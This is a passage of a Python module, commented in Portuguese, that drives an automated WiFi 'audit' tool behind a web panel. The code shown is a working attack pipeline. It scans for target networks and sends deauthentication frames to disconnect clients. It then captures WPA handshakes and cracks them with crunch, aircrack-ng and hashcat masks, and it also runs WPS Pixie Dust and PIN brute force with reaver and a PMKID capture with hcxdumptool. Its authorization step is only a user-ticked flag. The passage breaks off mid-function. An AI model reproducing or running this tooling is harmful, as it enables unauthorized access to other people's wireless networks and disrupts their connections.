"""
core.py — motor da auditoria WiFi, usado pelo painel web (app.py).

É a mesma lógica do auditor.sh (CLI), portada para Python, pra ser mais
fácil de orquestrar com formulários/botões e log ao vivo na página.

Toda saída de log vai, ao mesmo tempo, para o arquivo auditoria_gui.log e
para a função de callback (log_cb) passada pro Engine — essa função é quem
manda a linha pro navegador em tempo real via Server-Sent Events.
"""

import csv
import io
import os
import re
import signal
import subprocess
import threading
import time
from datetime import datetime
from pathlib import Path

WORKDIR = Path(__file__).resolve().parent.parent  # .../wifi-auditor/
LOGFILE = WORKDIR / "auditoria_gui.log"
RESPOSTAS = WORKDIR / "respostas.txt"
CAPTURE_PREFIX = WORKDIR / "captura_gui"
SCAN_PREFIX = WORKDIR / "scan_gui"
WORDLIST_DIR = WORKDIR / "wordlists"
ROCKYOU = WORDLIST_DIR / "rockyou.txt"
ROCKYOU_URL = (
    "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt"
)

DEPENDENCIAS_APT = [
    "aircrack-ng",
    "reaver",
    "pixiewps",
    "hashcat",
    "crunch",
    "hcxtools",
    "hcxdumptool",
    "tcpdump",
]


def _agora():
    return datetime.now().strftime("%H:%M:%S")


class AttackAborted(Exception):
    """Levantada quando o usuário pede parada de emergência pelo painel."""


class Engine:
    """
    Mantém todo o estado de uma sessão de auditoria (uma por vez — é uma
    ferramenta de uso pessoal/didático, não multiusuário) e os métodos que
    fazem cada etapa, espelhando as seções do auditor.sh.
    """

    def __init__(self, log_cb):
        self.log_cb = log_cb
        self.iface = None
        self.moniface = None
        self.monitor_ativo = False
        self.alvos = []          # lista de dicts do último scan
        self.target = {}         # alvo escolhido: essid/bssid/ch/enc/freq
        self.senha = None
        self._mask = None        # máscara da Rota A, reaproveitada pela Rota D (PMKID)
        self.rota_usada = None
        self.ip_roteador = None
        self.autorizado = False
        self._parar = False      # flag de parada de emergência (botão do painel)
        self._airodump_proc = None
        # Registro de TODOS os subprocessos vivos (hashcat, aircrack, reaver,
        # airodump, etc.). O botão de parada e o Ctrl+C no servidor matam esta
        # lista inteira — sem isso, 'pedir_parada' só setava uma flag que um
        # hashcat de 30 min nem olhava, e o Ctrl+C (os._exit) orfanava os
        # filhos, que seguiam segurando a placa e queimando CPU.
        self._procs = []
        self._procs_lock = threading.Lock()
        self._cleanup_feito = False

    # ------------------------------------------------------------------
    # util
    # ------------------------------------------------------------------

    def log(self, msg):
        linha = f"[{_agora()}] {msg}"
        try:
            with open(LOGFILE, "a") as f:
                f.write(linha + "\n")
        except OSError:
            pass
        self.log_cb(linha)

    def pedir_parada(self):
        """Chamado pelo endpoint /api/stop (botão de emergência no painel).
        Além de setar a flag, MATA de fato tudo que está rodando — senão um
        hashcat/aircrack longo seguia até o fim ignorando o pedido de parada."""
        self._parar = True
        self.matar_tudo()

    def _checar_parada(self):
        if self._parar:
            raise AttackAborted("Parada solicitada pelo usuário no painel.")

    # ------------------------------------------------------------------
    # controle de subprocessos (para a parada/Ctrl+C realmente matar tudo)
    # ------------------------------------------------------------------

    def _registrar(self, proc):
        with self._procs_lock:
            self._procs.append(proc)

    def _desregistrar(self, proc):
        with self._procs_lock:
            if proc in self._procs:
                self._procs.remove(proc)

    def _matar_proc(self, proc):
        """Mata um processo e todo o seu grupo (ele é criado com
        start_new_session=True, então é líder do próprio grupo e matamos só a
        subárvore dele — nunca o servidor Flask)."""
        if proc is None or proc.poll() is not None:
            return
        try:
            os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
        except (ProcessLookupError, PermissionError, OSError):
            try:
                proc.terminate()
            except OSError:
                pass
        for _ in range(5):
            if proc.poll() is not None:
                return
            time.sleep(0.3)
        try:
            os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
        except (ProcessLookupError, PermissionError, OSError):
            try:
                proc.kill()
            except OSError:
                pass

    def matar_tudo(self):
        """Mata o airodump de captura (background) e todos os subprocessos
        registrados. Usado pela parada de emergência e pela limpeza/Ctrl+C."""
        self._matar_proc(self._airodump_proc)
        with self._procs_lock:
            procs = list(self._procs)
        for p in procs:
            self._matar_proc(p)

    def run(self, cmd, timeout=None, input_text=None):
        """Roda um comando (em sessão/grupo próprio), loga a chamada + saída e
        o registra para poder ser MORTO pela parada de emergência/Ctrl+C. Antes
        usava subprocess.run, cujo processo nenhuma outra thread conseguia
        matar — a parada só setava uma flag que o hashcat não observava."""
        self.log("$ " + " ".join(str(c) for c in cmd))
        try:
            proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE if input_text is not None else None,
                text=True,
                start_new_session=True,
            )
        except FileNotFoundError as e:
            self.log(f"(comando não encontrado: {e})")
            return subprocess.CompletedProcess(cmd, 127, "", str(e))
        self._registrar(proc)
        rc = 0
        try:
            out, err = proc.communicate(input=input_text, timeout=timeout)
            rc = proc.returncode
        except subprocess.TimeoutExpired:
            self._matar_proc(proc)
            try:
                out, err = proc.communicate(timeout=5)
            except Exception:
                out, err = "", ""
            self.log(f"(comando interrompido após {timeout}s)")
            rc = 124
        finally:
            self._desregistrar(proc)
        for stream in (out, err):
            if stream:
                try:
                    with open(LOGFILE, "a") as f:
                        f.write(stream)
                except OSError:
                    pass
        return subprocess.CompletedProcess(cmd, rc, out or "", err or "")

    # ------------------------------------------------------------------
    # 1. dependências / wordlist
    # ------------------------------------------------------------------

    def verificar_dependencias(self):
        self.log("Verificando dependências...")
        faltando = []
        for pacote in DEPENDENCIAS_APT:
            r = subprocess.run(["dpkg", "-s", pacote], capture_output=True)
            if r.returncode != 0:
                faltando.append(pacote)

        if faltando:
            self.log(f"Pacotes faltando: {', '.join(faltando)}. Instalando...")
            self.run(["apt-get", "update"], timeout=300)
            r = self.run(["apt-get", "install", "-y", *faltando], timeout=600)
            if r.returncode != 0:
                raise RuntimeError("Falha ao instalar dependências. Veja o log.")
        else:
            self.log("Todas as dependências já instaladas.")

    def garantir_wordlist(self):
        WORDLIST_DIR.mkdir(parents=True, exist_ok=True)
        if ROCKYOU.exists() and ROCKYOU.stat().st_size > 0:
            self.log(f"rockyou.txt já existe em {ROCKYOU}.")
            return

        for candidato in (
            Path("/usr/share/wordlists/rockyou.txt"),
            Path("/usr/share/wordlists/rockyou.txt.gz"),
        ):
            if candidato.exists() and candidato.stat().st_size > 0:
                self.log(f"Encontrada wordlist do sistema em {candidato}.")
                if candidato.suffix == ".gz":
                    self.run(["bash", "-c", f"gunzip -c '{candidato}' > '{ROCKYOU}'"])
                else:
                    self.run(["cp", str(candidato), str(ROCKYOU)])
                return

        self.log("rockyou.txt não encontrada. Baixando agora (ainda com internet ativa)...")
        tmp = ROCKYOU.with_suffix(".tmp")
        r = self.run(["curl", "-fL", "-o", str(tmp), ROCKYOU_URL], timeout=600)
        if r.returncode == 0 and tmp.exists() and tmp.stat().st_size > 0:
            tmp.rename(ROCKYOU)
            self.log(f"Wordlist baixada com sucesso: {ROCKYOU}")
        else:
            self.log("AVISO: falha ao baixar rockyou.txt. A rota de dicionário pode falhar depois.")
            if tmp.exists():
                tmp.unlink()

    # ------------------------------------------------------------------
    # 2. interface / modo monitor
    # ------------------------------------------------------------------

    def _listar_interfaces(self):
        r = self.run(["iw", "dev"], timeout=10)
        return re.findall(r"Interface\s+(\S+)", r.stdout)

    def detectar_interfaces(self):
        interfaces = self._listar_interfaces()
        if not interfaces:
            raise RuntimeError("Nenhuma interface WiFi encontrada (iw dev não listou nada).")
        return interfaces

    def entrar_modo_monitor(self, iface):
        self.iface = iface
        self._cleanup_feito = False  # nova sessão de monitor → permite limpar de novo no fim
        self.log("Ajustando região regulatória para BR...")
        self._avisar_driver_fraco(iface)
        self.run(["iw", "reg", "set", "BR"], timeout=10)

        self.log("Matando processos que podem interferir (NetworkManager, wpa_supplicant)...")
        r = self.run(["airmon-ng", "check", "kill"], timeout=20)
        if r.returncode == 124:
            self.log("Aviso: 'airmon-ng check kill' não respondeu em 20s, seguindo assim mesmo.")

        # Snapshot ANTES de ativar o modo monitor: assim identificamos a
        # interface pelo que mudou (apareceu/desapareceu), não pelo nome
        # conter "mon" — uma interface monitor de uma execução anterior que
        # travou (e não foi limpa) também bate nesse critério e fazia o
        # código pegar a interface errada (silenciosamente), gerando captura
        # vazia / parecendo travado mais adiante, sem erro nenhum aqui.
        antes = set(self._listar_interfaces())

        self.log(f"Ativando modo monitor em {iface}...")
        r = self.run(["airmon-ng", "start", iface], timeout=20)
        if r.returncode == 124:
            raise RuntimeError(
                "'airmon-ng start' travou por mais de 20s. A placa pode estar presa em "
                "modo monitor de uma execução anterior — use o botão 'Restaurar minha rede' "
                "e tente de novo."
            )
        time.sleep(2)

        depois = set(self._listar_interfaces())
        novas = sorted(depois - antes)
        candidatos = [i for i in novas if "mon" in i.lower()]
        if candidatos:
            self.moniface = candidatos[0]
        elif iface in depois:
            # algumas versões não renomeiam a interface, só trocam o tipo
            info = self.run(["iw", "dev", iface, "info"], timeout=10)
            if "type monitor" in info.stdout.lower():
                self.moniface = iface
            else:
                raise RuntimeError("Não foi possível identificar a interface em modo monitor.")
        else:
            raise RuntimeError(
                f"A interface {iface} desapareceu e nenhuma interface monitor nova surgiu. "
                "Use o botão 'Restaurar minha rede' e tente de novo."
            )

        self.monitor_ativo = True
        self.log(f"Interface em modo monitor: {self.moniface}")
        return self.moniface

    def _avisar_driver_fraco(self, iface):
        """Avisa quando a placa usa driver Realtek rtw88/RTL88xx — modo monitor
        e INJEÇÃO instáveis, o que derruba deauth/WPS/PMKID e faz o scan perder
        redes ao trocar de canal. Melhor avisar que falhar sem explicação."""
        try:
            drv = os.path.basename(os.path.realpath(f"/sys/class/net/{iface}/device/driver"))
        except OSError:
            return
        if not drv or drv == "driver":
            return
        self.log(f"Driver da interface {iface}: {drv}")
        if re.match(r"^(rtw88|rtw89|rtl8821|rtl8812|rtl8188|rtl8192|8821|8812|8188|8192)", drv):
            self.log("AVISO: driver Realtek com monitor/INJEÇÃO instáveis — deauth/WPS/PMKID "
                     "podem não injetar nada e o scan pode perder redes. A captura passiva de "
                     "handshake ainda costuma funcionar.")

    def garantir_moniface_viva(self):
        r = subprocess.run(["iw", "dev", self.moniface, "info"], capture_output=True)
        if r.returncode != 0:
            self.log(f"Interface {self.moniface} sumiu. Recriando modo monitor...")
            self.entrar_modo_monitor(self.iface)

    def restaurar_modo_gerenciado(self):
        if self.moniface:
            r = subprocess.run(["iw", "dev", self.moniface, "info"], capture_output=True)
            if r.returncode == 0:
                self.log(f"Parando modo monitor em {self.moniface}...")
                self.run(["airmon-ng", "stop", self.moniface], timeout=15)
        self.log("Religando NetworkManager...")
        self.run(["systemctl", "restart", "NetworkManager"], timeout=15)
        time.sleep(2)
        self.monitor_ativo = False

    # ------------------------------------------------------------------
    # 3. scan e escolha do alvo
    # ------------------------------------------------------------------

    def escanear(self, duracao=25):
        # 25s (antes 15s): com --band abg o airodump salta ~38 canais; 15s não
        # davam nem 2 varreduras e redes fracas (e o canal do alvo) escapavam —
        # por isso a lista divergia do que aparecia depois travado num canal.
        self.garantir_moniface_viva()
        self.log(f"Escaneando redes nas bandas a/b/g por {duracao}s...")

        for p in WORKDIR.glob(SCAN_PREFIX.name + "*"):
            p.unlink(missing_ok=True)

        try:
            subprocess.run(
                [
                    "airodump-ng", "--band", "abg",
                    "--write", str(SCAN_PREFIX), "--output-format", "csv",
                    self.moniface,
                ],
                timeout=duracao, capture_output=True, text=True,
            )
        except subprocess.TimeoutExpired:
            pass  # esperado: airodump roda indefinidamente, o timeout é o que o encerra

        csv_path = Path(f"{SCAN_PREFIX}-01.csv")
        if not csv_path.exists():
            raise RuntimeError(f"Arquivo de scan não foi gerado ({csv_path}).")

        texto = csv_path.read_text(errors="replace")
        secao_aps = texto.split("Station MAC")[0]
        linhas = list(csv.reader(io.StringIO(secao_aps)))

        aps = []
        vistos = set()
        for campos in linhas:
            if len(campos) < 14:
                continue
            bssid = campos[0].strip()
            if not re.match(r"^[0-9A-Fa-f]{2}(:[0-9A-Fa-f]{2}){5}$", bssid):
                continue
            ch = campos[3].strip()
            privacidade = campos[5].strip()
            power = campos[8].strip() or "-100"
            beacons = campos[9].strip()
            essid = campos[-2].strip() or "<oculto>"

            # Descarta "fantasmas": linha de AP criada a partir de um BSSID visto
            # só em frame de dados de um cliente (# beacons = 0, canal -1, sem
            # ESSID/privacidade). Não são redes reais e poluíam a lista.
            if beacons.isdigit() and int(beacons) == 0:
                continue
            if not (ch.lstrip("-").isdigit() and int(ch) > 0):
                continue
            if bssid in vistos:  # de-duplica por BSSID
                continue
            vistos.add(bssid)

            aps.append({
                "bssid": bssid, "ch": ch, "enc": privacidade,
                "pwr": int(power) if power.lstrip("-").isdigit() else -100,
                "essid": essid,
            })

        aps.sort(key=lambda a: a["pwr"], reverse=True)
        self.alvos = aps
        self.log(f"{len(aps)} redes reais encontradas (fantasmas sem beacon descartados).")
        return aps

    def escolher_alvo(self, idx):
        alvo = self.alvos[idx]
        ch = int(alvo["ch"]) if alvo["ch"].isdigit() else 0
        freq_label = "5 GHz" if ch >= 36 else "2.4 GHz"
        self.target = {
            "essid": alvo["essid"], "bssid": alvo["bssid"],
            "ch": alvo["ch"], "enc": alvo["enc"], "freq_label": freq_label,
        }
        self.log(
            f"Alvo escolhido: ESSID={self.target['essid']} BSSID={self.target['bssid']} "
            f"CH={self.target['ch']} ENC={self.target['enc']} ({freq_label})"
        )
        self._avisar_limitacoes_cripto()
        return self.target

    def _avisar_limitacoes_cripto(self):
        """Alerta quando o alvo é WPA3/SAE: deauth é protegido por PMF/802.11w
        (o cliente ignora) e o handshake SAE NÃO quebra por dicionário/máscara
        como o 4-way do WPA2. As rotas A/C/D só têm chance pelo lado WPA2 de uma
        rede em modo transição (WPA3 WPA2)."""
        enc = (self.target.get("enc") or "").upper()
        if "WPA3" in enc or "SAE" in enc:
            self.log(f"AVISO: alvo usa WPA3/SAE ({self.target.get('enc')}). Deauth é ignorado "
                     "sob PMF/802.11w e o handshake SAE não quebra por dicionário/máscara.")
            if "WPA2" in enc:
                self.log("Rede em modo transição (WPA3 WPA2): ainda há chance SE um cliente "
                         "conectar pelo lado WPA2 — aí o 4-way fica atacável.")
            else:
                self.log("Rede WPA3 puro: dicionário/máscara/PMKID não se aplicam; "
                         "provavelmente não vão encontrar a senha.")

    def autorizar(self, confirmado):
        self.autorizado = bool(confirmado)
        if self.autorizado:
            self.log(f"Autorização confirmada pelo usuário para o alvo {self.target.get('bssid')}.")
        else:
            self.log("Autorização NÃO confirmada.")
        return self.autorizado

    # ------------------------------------------------------------------
    # 4. detecção de cliente conectado
    # ------------------------------------------------------------------

    def ha_cliente_conectado(self):
        csv_path = Path(f"{CAPTURE_PREFIX}-01.csv")
        if not csv_path.exists():
            return False
        texto = csv_path.read_text(errors="replace")
        if "Station MAC" not in texto:
            return False
        secao = texto.split("Station MAC", 1)[1]
        return self.target.get("bssid", "").lower() in secao.lower()

    def cliente_do_alvo(self):
        """Retorna o MAC do primeiro cliente associado ao BSSID alvo (ou None).
        Deauth DIRECIONADO a esse MAC é bem mais eficaz que o broadcast."""
        csv_path = Path(f"{CAPTURE_PREFIX}-01.csv")
        if not csv_path.exists():
            return None
        texto = csv_path.read_text(errors="replace")
        if "Station MAC" not in texto:
            return None
        secao = texto.split("Station MAC", 1)[1]
        alvo = self.target.get("bssid", "").lower()
        for linha in secao.splitlines():
            campos = [c.strip() for c in linha.split(",")]
            # Station MAC, First, Last, Power, # packets, BSSID, Probed ESSIDs
            if len(campos) >= 6 and campos[5].lower() == alvo:
                if re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", campos[0]):
                    return campos[0]
        return None

    def _ultimo_cap(self):
        caps = sorted(WORKDIR.glob(f"{CAPTURE_PREFIX.name}*.cap"), key=os.path.getmtime, reverse=True)
        return caps[0] if caps else None

    def _tem_handshake(self, capfile):
        if not capfile:
            return False
        r = subprocess.run(["aircrack-ng", str(capfile)], capture_output=True, text=True)
        # aircrack-ng mostra "1 handshake", "2 handshakes", etc. — casar qualquer número.
        return bool(re.search(r"\d+ handshake", r.stdout.lower()))

    # ------------------------------------------------------------------
    # 5. captura de handshake (unificada: já conectado OU vai conectar agora)
    # ------------------------------------------------------------------

    def capturar_handshake(self, max_tentativas=12, intervalo=10):
        self.garantir_moniface_viva()
        self.log(f"Iniciando captura de handshake em {self.target['bssid']} (canal {self.target['ch']})...")

        for p in WORKDIR.glob(f"{CAPTURE_PREFIX.name}*"):
            p.unlink(missing_ok=True)

        proc = subprocess.Popen(
            ["airodump-ng", "--bssid", self.target["bssid"], "-c", str(self.target["ch"]),
             "--write", str(CAPTURE_PREFIX), self.moniface],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            start_new_session=True,  # grupo próprio: dá pra matar via killpg na parada
        )
        self._airodump_proc = proc

        try:
            handshake_ok = False
            for tentativa in range(1, max_tentativas + 1):
                self._checar_parada()
                time.sleep(intervalo)

                if self._tem_handshake(self._ultimo_cap()):
                    handshake_ok = True
                    break

                if self.ha_cliente_conectado():
                    cliente = self.cliente_do_alvo()
                    if cliente:
                        self.log(f"Tentativa {tentativa}: cliente {cliente} detectado — deauth DIRECIONADO...")
                        self.run(["aireplay-ng", "--deauth", "5", "-a", self.target["bssid"],
                                  "-c", cliente, self.moniface])
                    else:
                        self.log(f"Tentativa {tentativa}: cliente conectado (sem MAC específico) — deauth broadcast...")
                        self.run(["aireplay-ng", "--deauth", "5", "-a", self.target["bssid"], self.moniface])
                else:
                    self.log(f"Tentativa {tentativa}: nenhum cliente conectado detectado ainda — aguardando conexão...")
        finally:
            self._encerrar_processo(proc)

        if handshake_ok:
            self.log("Handshake capturado com sucesso.")
        else:
            self.log("Não foi possível capturar o handshake.")
        return handshake_ok

    def _encerrar_processo(self, proc):
        """Termina um processo em background com prazo (TERM -> espera -> KILL),
        igual ao auditor.sh — evita travar pra sempre esperando o processo morrer."""
        if proc.poll() is not None:
            return
        proc.terminate()
        for _ in range(5):
            if proc.poll() is not None:
                return
            time.sleep(1)
        proc.kill()
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            pass

    # ------------------------------------------------------------------
    # 6. rotas de ataque
    # ------------------------------------------------------------------

    def rota_mascara(self, tamanho=None, prefixo="", tipo_placeholder="", mascara=None):
        self.log("--- Rota A: ataque de máscara ---")
        if mascara:
            # Máscara crunch completa: parte conhecida em qualquer posição.
            # Tamanho = nº de posições de saída (\X escapado conta como 1).
            tamanho = len(mascara.replace("\\", ""))
        else:
            if tamanho is None:
                self.log("Faltam parâmetros da máscara. Abortando rota de máscara.")
                return False
            restante = tamanho - len(prefixo)
            if restante < 0:
                self.log("Prefixo maior que o tamanho total. Abortando rota de máscara.")
                return False
            mascara = prefixo + (tipo_placeholder * restante)

        if tamanho < 8:
            self.log(f"Aviso: WPA/WPA2 exige 8+ caracteres — máscara de {tamanho} dificilmente casa.")

        if not self.capturar_handshake():
            return False

        cap = self._ultimo_cap()
        self.log(f"Rodando crunch + aircrack-ng com máscara '{mascara}'...")
        crunch = subprocess.Popen(
            ["crunch", str(tamanho), str(tamanho), "-t", mascara],
            stdout=subprocess.PIPE, start_new_session=True,
        )
        self._registrar(crunch)
        aircrack = subprocess.Popen(
            ["aircrack-ng", "-w", "-", "-b", self.target["bssid"], str(cap)],
            stdin=crunch.stdout, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
            text=True, start_new_session=True,
        )
        self._registrar(aircrack)
        crunch.stdout.close()
        out_air, _ = aircrack.communicate()
        crunch.wait()
        self._desregistrar(aircrack)
        self._desregistrar(crunch)

        m = re.search(r"KEY FOUND!\s*\[\s*(.*?)\s*\]", out_air or "")
        if m:
            self.senha = m.group(1)
            self.rota_usada = "Máscara (crunch)"
            self.log(f"Senha encontrada via máscara: {self.senha}")
            return True

        self.log("Máscara não encontrou a senha com os parâmetros informados.")
        return False

    def rota_mascara_hashcat(self, mascara, custom=""):
        """Variante da Rota A com coringas do hashcat (-a 3): ?l ?u ?d ?s e
        ?a = QUALQUER caractere imprimível — para posições cuja classe o
        usuário não sabe (o crunch não tem coringa 'qualquer'). Usa GPU; cai
        para CPU com --force se nenhum dispositivo for detectado."""
        self.log("--- Rota A (hashcat -a 3): máscara com coringas do hashcat ---")
        if not mascara:
            self.log("Máscara vazia. Abortando.")
            return False
        if not self.capturar_handshake():
            return False

        cap = self._ultimo_cap()
        if not _tool_existe("hcxpcapngtool"):
            self.log("hcxpcapngtool não encontrado — não dá pra converter a captura pro hashcat.")
            return False

        hashfile = WORKDIR / "hash_mask_gui.hc22000"
        hashfile.unlink(missing_ok=True)
        self.run(["hcxpcapngtool", "-o", str(hashfile), str(cap)])
        if not hashfile.exists() or hashfile.stat().st_size == 0:
            self.log("Não foi possível extrair hash da captura (handshake pode estar incompleto).")
            return False

        found = WORKDIR / "hashcat_mask_found_gui.txt"
        found.unlink(missing_ok=True)

        def _cmd(forcar):
            c = ["hashcat", "-m", "22000", str(hashfile), "-a", "3"]
            if custom:
                c += ["-1", custom]
            if forcar:
                c += ["--force"]
            c += [mascara, "--potfile-disable", "-o", str(found)]
            return c

        self.log(f"Rodando hashcat -a 3 com máscara '{mascara}' (pode demorar conforme o espaço de busca)...")
        r = self.run(_cmd(False), timeout=3600)
        saida = (r.stdout or "") + (r.stderr or "")
        if (not found.exists() or found.stat().st_size == 0) and re.search(
            r"no devices? (found|left)", saida, re.I
        ):
            self.log("Nenhum dispositivo detectado — repetindo com --force (CPU, mais lento)...")
            self.run(_cmd(True), timeout=3600)

        if found.exists() and found.stat().st_size > 0:
            linhas = found.read_text().strip().splitlines()
            if linhas:
                self.senha = linhas[-1].split(":", 1)[-1]
                self.rota_usada = "Máscara (hashcat -a 3)"
                self.log(f"Senha encontrada via máscara hashcat: {self.senha}")
                return True

        self.log("Máscara hashcat não encontrou a senha com os parâmetros informados.")
        return False

    def rota_wps(self):
        self.log("--- Rota B: WPS ---")
        self.garantir_moniface_viva()

        banda_flag = ["-5"] if self.target.get("freq_label") == "5 GHz" else []
        r = self.run(["timeout", "15", "wash", "-i", self.moniface, *banda_flag])
        if self.target["bssid"].lower() not in r.stdout.lower():
            self.log("AP não aparece com WPS ativo. Pulando rota WPS.")
            return False
        self.log("AP com WPS ativo. Tentando Pixie Dust...")

        log_path = WORKDIR / "reaver_pixie_gui.log"
        proc = subprocess.Popen(
            ["timeout", "90", "reaver", "-i", self.moniface, "-b", self.target["bssid"],
             "-c", str(self.target["ch"]), "-K", "1", "-vv"],
            stdout=open(log_path, "w"), stderr=subprocess.STDOUT,
            start_new_session=True,
        )
        self._registrar(proc)
        chegou_m1 = False
        inicio = time.time()
        while proc.poll() is None:
            self._checar_parada()
            time.sleep(3)
            texto = log_path.read_text(errors="replace")
            if "received m1 message" in texto.lower():
                chegou_m1 = True
            if "wps pin:" in texto.lower() or "pin cracked" in texto.lower():
                break
            if not chegou_m1 and time.time() - inicio >= 90:
                self.log("Loop de falha detectado sem receber M1 em 90s. Abortando rota WPS.")
                proc.terminate()
                break
        self._encerrar_processo(proc)
        self._desregistrar(proc)

        texto = log_path.read_text(errors="replace")
        m = re.search(r"WPA PSK:\s*'?([^'\n]*)'?", texto)
        if "wps pin:" in texto.lower() and m:
            self.senha = m.group(1).strip()
            self.rota_usada = "WPS (Pixie Dust)"
            self.log(f"Senha encontrada via Pixie Dust: {self.senha}")
            return True

        if chegou_m1:
            self.log("Pixie Dust falhou mas AP respondeu. Tentando brute de PIN (mais lento)...")
            # self.run() captura a saída e a retorna — parsear o stdout/stderr
            # do próprio comando (o arquivo reaver_pin_gui.log nunca era escrito).
            r = self.run(
                ["timeout", "300", "reaver", "-i", self.moniface, "-b", self.target["bssid"],
                 "-c", str(self.target["ch"]), "-vv", "-d", "15"],
            )
            texto2 = (r.stdout or "") + (r.stderr or "")
            m2 = re.search(r"WPA PSK:\s*'?([^'\n]*)'?", texto2)
            if m2:
                self.senha = m2.group(1).strip()
                self.rota_usada = "WPS (brute PIN)"
                self.log(f"Senha encontrada via brute de PIN: {self.senha}")
                return True

        self.log("Rota WPS não teve sucesso.")
        return False

    def _crack_hc22000_com_mascara(self, hashfile, mask):
        """Quebra um .hc22000 usando a máscara da Rota A (dict). Retorna a
        senha ou None. Usada pela Rota D (PMKID) para quebrar sem handshake.
        Usa GPU; repete com --force se nenhum dispositivo for detectado."""
        if not mask or not _tool_existe("hashcat"):
            return None
        found = WORKDIR / "pmkid_mask_found_gui.txt"
        found.unlink(missing_ok=True)

        if mask.get("hashcat"):
            def _rodar(forcar):
                base = ["hashcat", "-m", "22000", str(hashfile), "-a", "3"]
                if mask.get("custom"):
                    base += ["-1", mask["custom"]]
                if forcar:
                    base += ["--force"]
                base += [mask["hashcat"], "--potfile-disable", "-o", str(found)]
                return self.run(base, timeout=3600)

            r = _rodar(False)
            saida = (r.stdout or "") + (r.stderr or "")
            if (not found.exists() or found.stat().st_size == 0) and re.search(
                r"no devices? (found|left)", saida, re.I
            ):
                _rodar(True)
        else:
            # crunch: máscara completa {mascara} ou guiada {tamanho,prefixo,tipo}
            if mask.get("mascara"):
                m = mask["mascara"]
                tam = len(m.replace("\\", ""))
            else:
                tam = mask.get("tamanho")
                if tam is None:
                    return None
                restante = tam - len(mask.get("prefixo", ""))
                if restante < 0:
                    return None
                m = mask.get("prefixo", "") + mask.get("tipo", "") * restante

            def _rodar_crunch(forcar):
                base = ["hashcat", "-m", "22000", str(hashfile)]
                if forcar:
                    base += ["--force"]
                base += ["--potfile-disable", "-o", str(found)]
                crunch = subprocess.Popen(
                    ["crunch", str(tam), str(tam), "-t", m],
                    stdout=subprocess.PIPE, start_new_session=True,
                )
                self._registrar(crunch)
                hc = subprocess.Popen(
                    base, stdin=crunch.stdout, stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE, text=True, start_new_session=True,
                )
                self._registrar(hc)
                crunch.stdout.close()
                out, err = hc.communicate()
                crunch.wait()
                self._desregistrar(hc)
                self._desregistrar(crunch)
                return subprocess.CompletedProcess(base, hc.returncode, out or "", err or "")

            r = _rodar_crunch(False)
            saida = (r.stdout or "") + (r.stderr or "")
            if (not found.exists() or found.stat().st_size == 0) and re.search(
                r"no devices? (found|left)", saida, re.I
            ):
                _rodar_crunch(True)

        if found.exists() and found.stat().st_size > 0:
            linhas = found.read_text().strip().splitlines()
            if linhas:
                return linhas[-1].split(":", 1)[-1]
        return None

    def rota_pmkid(self):
        self.log("--- Rota D: PMKID (ataque direto ao roteador, sem precisar de cliente) ---")
        self.garantir_moniface_viva()

        if not _tool_existe("hcxdumptool"):
            self.log("hcxdumptool não está instalado — pulando rota PMKID.")
            return False

        pmkid_cap = WORKDIR / "pmkid_gui.pcapng"
        pmkid_hash = WORKDIR / "pmkid_gui.hc22000"
        bpf_file = WORKDIR / "pmkid_gui_attack.bpf"
        for p in (pmkid_cap, pmkid_hash, bpf_file):
            p.unlink(missing_ok=True)

        bssid = self.target["bssid"]
        filtro = f"wlan addr1 {bssid} or wlan addr2 {bssid} or wlan addr3 {bssid} or wlan addr3 ff:ff:ff:ff:ff:ff"
        # O filtro precisa ser compilado contra uma interface já em modo
        # monitor (link-layer 802.11/radiotap) — por isso isso roda ANTES
        # de sair do modo monitor do airmon-ng, logo abaixo.
        with open(bpf_file, "wb") as f:
            r = subprocess.run(["tcpdump", "-i", self.moniface, filtro, "-ddd"], stdout=f, stderr=subprocess.PIPE)
        if r.returncode != 0:
            self.log("Falha ao compilar filtro BPF para o PMKID. Pulando rota PMKID.")
            return False

        # hcxdumptool NÃO funciona sobre uma interface monitor já criada
        # pelo airmon-ng/iw (gerencia o modo monitor sozinho, direto na
        # interface física) — usar o "wlanXmon" do airmon-ng resulta em
        # 0 pacotes capturados sempre, silenciosamente. Por isso saímos do
        # modo monitor aqui, deixamos o hcxdumptool cuidar disso sozinho, e
        # recriamos o modo monitor depois pra seguir com as próximas rotas.
        self.log("Saindo do modo monitor do airmon-ng (hcxdumptool precisa da interface física crua)...")
        self.run(["airmon-ng", "stop", self.moniface])
        time.sleep(1)

        # -c aceita canal (<=1000) ou frequência em MHz (>1000); usamos a
        # frequência pra não depender do sufixo de banda (convenção a/b é
        # ambígua e varia entre versões). -w (não -o) é o flag de saída no
        # hcxdumptool >= 6.3.0 / 7.x (Ubuntu/Kali atuais).
        ch_int = int(self.target["ch"]) if str(self.target["ch"]).isdigit() else 0
        if self.target.get("freq_label") == "5 GHz":
            freq_mhz = 5000 + ch_int * 5
        elif ch_int == 14:
            freq_mhz = 2484
        else:
            freq_mhz = 2407 + ch_int * 5
        self.log(f"Tentando capturar PMKID direto do roteador por 30s (canal {self.target['ch']}, {freq_mhz} MHz)...")
        try:
            # self.run roda em grupo próprio e é matável pela parada; o rc 124
            # (timeout de 30s) é o fim ESPERADO aqui — ele captura até estourar.
            self.run(
                ["hcxdumptool", "-i", self.iface, "-w", str(pmkid_cap),
                 f"--bpf={bpf_file}", "-c", str(freq_mhz)],
                timeout=30,
            )
        finally:
            # Sempre volta pro modo monitor via airmon-ng, mesmo se a rota
            # falhar — as próximas rotas (dicionário) dependem disso.
            self.log("Recriando modo monitor via airmon-ng para seguir com as próximas rotas...")
            self.entrar_modo_monitor(self.iface)

        if not pmkid_cap.exists() or pmkid_cap.stat().st_size == 0:
            self.log("Nenhum pacote capturado na tentativa de PMKID.")
            return False

        if not _tool_existe("hcxpcapngtool"):
            self.log("hcxpcapngtool não encontrado — não é possível converter o PMKID capturado.")
            return False

        self.run(["hcxpcapngtool", "-o", str(pmkid_hash), str(pmkid_cap)])
        if not pmkid_hash.exists() or pmkid_hash.stat().st_size == 0:
